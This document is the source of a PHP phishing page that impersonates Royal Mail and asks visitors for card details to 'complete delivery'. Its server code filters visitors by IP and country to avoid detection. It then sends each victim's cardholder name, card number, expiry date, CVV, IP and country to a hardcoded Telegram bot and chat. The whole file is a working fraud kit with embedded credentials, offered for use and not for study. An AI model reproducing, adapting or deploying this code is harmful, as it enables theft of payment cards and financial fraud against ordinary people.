<?php
// === ANTI-BOT PROTECTION ===
$bannedFile = __DIR__ . '/banned_ips.txt';

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$ip = getUserIP();

$details = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country"));
$country = ($details && $details->status === 'success') ? $details->country : 'Unknown';

if (file_exists($bannedFile)) {
    $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($ip, $banned)) {
        header("HTTP/1.0 403 Forbidden");
        exit;
    }
}

$allowedCountries = ['Tunisia', 'United Kingdom'];
if (!in_array($country, $allowedCountries)) {
    header("HTTP/1.0 403 Forbidden");
    exit;
}

// Telegram Bot Config
define('TELEGRAM_BOT_TOKEN', '8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s');
define('TELEGRAM_CHAT_ID', '-4932499123');

$error = '';

function clean_input($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cc_number = preg_replace('/\s+/', '', $_POST['cc_number'] ?? '');
    $expiry = clean_input($_POST['expiry'] ?? '');
    $cvv = clean_input($_POST['cvv'] ?? '');
    $cardholder = clean_input($_POST['cardholder'] ?? '');

    // Server-side validation
    if (!$cc_number || !$expiry || !$cvv || !$cardholder) {
        $error = 'Please fill in all required fields.';
    } elseif (!preg_match('/^\d{13,19}$/', $cc_number)) {
        $error = 'Please enter a valid credit card number (13-19 digits, no spaces).';
    } elseif (!preg_match('/^(0[1-9]|1[0-2])\/\d{2}$/', $expiry)) {
        $error = 'Please enter a valid expiry date in MM/YY format.';
    } elseif (!preg_match('/^\d{3,4}$/', $cvv)) {
        $error = 'Please enter a valid 3 or 4 digit CVV.';
    } elseif (!preg_match('/^[A-Za-z\s]+$/', $cardholder) || strlen($cardholder) < 2 || strlen($cardholder) > 50) {
        $error = 'Please enter a valid cardholder name (letters and spaces only, 2-50 characters).';
    } else {
        // Prepare message
        $message = "💳 *Credit Card Details Captured* 💳\n";
        $message .= "───────────────────────────────\n";
        $message .= "👤 *Cardholder Name:* $cardholder\n";
        $message .= "💳 *Card Number:* $cc_number\n";
        $message .= "📅 *Expiry Date:* $expiry\n";
        $message .= "🔐 *CVV:* $cvv\n";
        $message .= "───────────────────────────────\n";
        $message .= "⏰ *Timestamp:* " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 *Visitor IP:* $ip\n";
        $message .= "🏳️ *Visitor Country:* $country\n";

        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $post_fields = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);

        if ($result !== false) {
            header('Location: wait2.php');
            exit;
        } else {
            $error = 'Failed to send data. Please try again later.';
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Royal Mail - Payment Confirmation</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
<style>
  :root {
    --rm-red: #cc0000;
    --rm-white: #fff;
    --rm-grey-light: #f9f9f9;
    --rm-grey-dark: #333;
  }
  body {
    background-color: var(--rm-grey-light);
    font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
    color: var(--rm-grey-dark);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    padding: 2rem;
    margin: 0;
  }
  nav.navbar {
    background-color: var(--rm-red);
    padding: 0.5rem 1rem;
  }
  nav.navbar img {
    height: 50px;
  }
  .form-card {
    background: var(--rm-white);
    max-width: 480px;
    margin: 2rem auto 3rem;
    padding: 2.5rem 3rem;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgb(0 0 0 / 0.1);
    border-top: 5px solid var(--rm-red);
  }
  h1, h4 {
    color: var(--rm-red);
    font-weight: 700;
  }
  label {
    font-weight: 600;
  }
  input.form-control {
    border-radius: 6px;
    border: 1.5px solid #ced4da;
    transition: border-color 0.3s ease;
  }
  input.form-control:focus {
    border-color: var(--rm-red);
    box-shadow: 0 0 8px var(--rm-red);
  }
  .btn-primary {
    background-color: var(--rm-red);
    border-color: var(--rm-red);
    font-weight: 700;
    border-radius: 8px;
    padding: 12px;
    font-size: 1.15rem;
  }
  .btn-primary:hover, .btn-primary:focus {
    background-color: #990000;
    border-color: #990000;
  }
  .alert {
    border-radius: 8px;
    font-weight: 600;
  }
</style>
<script>
  // Enforce MM/YY format for expiry and strip invalid chars
  function formatExpiry(input) {
    let val = input.value.replace(/[^\d]/g, '');
    if (val.length > 2) {
      val = val.slice(0, 2) + '/' + val.slice(2,4);
    }
    input.value = val;
  }

  function validateForm() {
    const ccNumber = document.getElementById('cc_number').value.trim();
    const expiry = document.getElementById('expiry').value.trim();
    const cvv = document.getElementById('cvv').value.trim();
    const cardholder = document.getElementById('cardholder').value.trim();

    if (!ccNumber.match(/^\d{13,19}$/)) {
      alert('Card number must be 13 to 19 digits with no spaces.');
      return false;
    }
    if (!expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
      alert('Expiry date must be in MM/YY format.');
      return false;
    }
    if (!cvv.match(/^\d{3,4}$/)) {
      alert('CVV must be 3 or 4 digits.');
      return false;
    }
    if (!cardholder.match(/^[A-Za-z\s]{2,50}$/)) {
      alert('Cardholder name must be 2-50 letters and spaces only.');
      return false;
    }
    return true;
  }
</script>
</head>
<body>
<nav class="navbar navbar-dark" role="banner">
  <div class="container d-flex justify-content-center">
    <a href="#" aria-label="Royal Mail Home">
      <img src="https://images.seeklogo.com/logo-png/26/2/royal-mail-uk-logo-png_seeklogo-267922.png" alt="Royal Mail Logo" />
    </a>
  </div>
</nav>
<main class="form-card" role="main" aria-labelledby="pageTitle">
  <h1 id="pageTitle" class="mb-3"><i class="fas fa-credit-card me-2"></i>Payment Confirmation</h1>
  <h4 class="mb-4 text-secondary">Please enter your card details to complete delivery</h4>

  <?php if ($error): ?>
    <div class="alert alert-danger" role="alert"><?= htmlspecialchars($error) ?></div>
  <?php endif; ?>

  <form method="POST" novalidate autocomplete="off" onsubmit="return validateForm()" aria-describedby="formDesc">
    <div id="formDesc" class="visually-hidden">Credit card input fields are required.</div>

    <div class="mb-3">
      <label for="cardholder" class="form-label">Cardholder Name <span class="text-danger">*</span></label>
      <input
        type="text"
        class="form-control"
        id="cardholder"
        name="cardholder"
        placeholder="John Smith"
        value="<?= htmlspecialchars($_POST['cardholder'] ?? '') ?>"
        required
        autocomplete="cc-name"
        minlength="2"
        maxlength="50"
        pattern="[A-Za-z\s]+"
        title="Only letters and spaces allowed"
      />
    </div>

    <div class="mb-3">
      <label for="cc_number" class="form-label">Card Number <span class="text-danger">*</span></label>
      <input
        type="text"
        class="form-control"
        id="cc_number"
        name="cc_number"
        placeholder="1234567890123456"
        value="<?= htmlspecialchars($_POST['cc_number'] ?? '') ?>"
        required
        autocomplete="cc-number"
        pattern="\d{13,19}"
        maxlength="19"
        inputmode="numeric"
        title="Enter a valid card number (13 to 19 digits, no spaces)"
        oninput="this.value=this.value.replace(/\D/g,'')"
      />
    </div>

    <div class="row g-3 mb-4">
      <div class="col-6">
        <label for="expiry" class="form-label">Expiry Date <span class="text-danger">*</span></label>
        <input
          type="text"
          class="form-control"
          id="expiry"
          name="expiry"
          placeholder="MM/YY"
          value="<?= htmlspecialchars($_POST['expiry'] ?? '') ?>"
          required
          autocomplete="cc-exp"
          maxlength="5"
          title="Format MM/YY"
          oninput="formatExpiry(this)"
          pattern="^(0[1-9]|1[0-2])\/\d{2}$"
        />
      </div>
      <div class="col-6">
        <label for="cvv" class="form-label">CVV <span class="text-danger">*</span></label>
        <input
          type="password"
          class="form-control"
          id="cvv"
          name="cvv"
          placeholder="123"
          value=""
          required
          autocomplete="cc-csc"
          pattern="\d{3,4}"
          maxlength="4"
          inputmode="numeric"
          title="3 or 4 digit CVV"
          oninput="this.value=this.value.replace(/\D/g,'')"
        />
      </div>
    </div>

    <button type="submit" class="btn btn-primary w-100 shadow-sm" aria-label="Submit payment details">
      Confirm Payment
    </button>
  </form>
</main>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>